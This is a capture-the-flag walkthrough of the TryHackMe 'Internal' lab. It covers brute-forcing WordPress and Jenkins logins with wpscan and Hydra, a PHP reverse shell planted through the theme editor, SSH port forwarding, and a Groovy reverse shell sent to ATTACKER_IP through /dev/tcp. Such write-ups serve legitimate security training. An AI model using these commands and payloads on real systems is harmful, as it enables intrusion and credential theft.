---
title: "Internal machine tryhackme writeup"
excerpt_separator: "<!--more-->"
date: 2023-11-18
categories:
  - TryHackMe Writeups
tags:
  - Hacking
  - Notes
  - writeup
  - ctf
---

### Internal (Difficulty: Hard) — TryHackMe Walkthrough

- *My writeups are more of my own mind-map than an "official" walkthrough, it may not seem straightforward sometimes but that's just the beauty of my own thinking.*

---

### Summary:

- Target exposed multiple web apps including WordPress and phpMyAdmin, leading to WordPress admin access via brute force.
- Theme editor RCE delivered a reverse shell and local enumeration revealed saved credentials.
- Pivoted to an internal Jenkins, forwarded over SSH, then abused Script Console for code execution to escalate to root.

### Target Surface:

- Discovered with nmap and directory brute forcing
    - /blog/
    - /javascript/ — forbidden
    - /phpmyadmin/
    - /server-status/ — forbidden
    - /wordpress/

### Tooling:

- Recon: nmap, gobuster
- Web: wpscan, Hydra
- Shells: netcat
- Access: SSH port forwarding

---

## User Flag:

1) Enumerate and identify WordPress

- Quick web dir brute force reveals /wordpress/ and /phpmyadmin/
- WordPress login present. User enumeration indicates user "admin"

2) Brute force WordPress admin

```bash
wpscan --url http://internal.thm -U admin -P /usr/share/wordlists/rockyou.txt
```

3) Get RCE via theme editor

- In wp-admin Appearance → Theme File Editor, edit 404.php with a PHP reverse shell
- Use pentestmonkey PHP reverse shell template

```bash
# Listener on attacker
nc -lvnp 4242
# Then visit /wp-content/themes/<theme>/404.php to trigger
```

4) Local enumeration → saved creds

- Look in /opt for interesting files
- Found /opt/wp-save.txt containing credentials for user aubreanna

5) SSH and grab user flag

- SSH to aubreanna with recovered credentials
- Read user.txt

> Trick 1: Theme editor RCE beats plugin rabbit holes. 404.php is reliably called.
> 

> Trick 2: /opt is a high‑signal directory for custom notes and saved creds.
> 

---

## Root Flag:

1) Do not ignore hints

- A jenkins.txt note mentioned an internal Jenkins service
- Initially skipped because of an internal IP — fix with port forwarding

2) Port forward Jenkins to [localhost](http://localhost)

```bash
ssh -L 6767:172.17.0.2:8080 aubreanna@internal.thm
# Browse http://127.0.0.1:6767
```

3) Brute force Jenkins login

```bash
hydra 127.0.0.1 -s 6767 -V -f \
  http-form-post \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" \
  -l admin -P /usr/share/wordlists/rockyou.txt
```

4) Code execution via Script Console

> Jenkins exposes a Groovy Script Console that can run arbitrary code in the master runtime.
> 
- Use Groovy to spawn a bash reverse shell

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT; cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()
```

- Keep netcat listener open. If tty is awkward, upgrade

```bash
/bin/bash -i
```

5) Loot and escalate

- As jenkins, enumerate for local notes
- Found /opt/note.txt with root credentials
- SSH to root and read /root/root.txt

> Trick 3: Always translate internal-only services into your browser with SSH -L.
> 

> Trick 4: Jenkins Script Console is a one‑stop RCE when authenticated.
> 

> Trick 5: Post‑ex creds often live in /opt or notes files.
> 

---
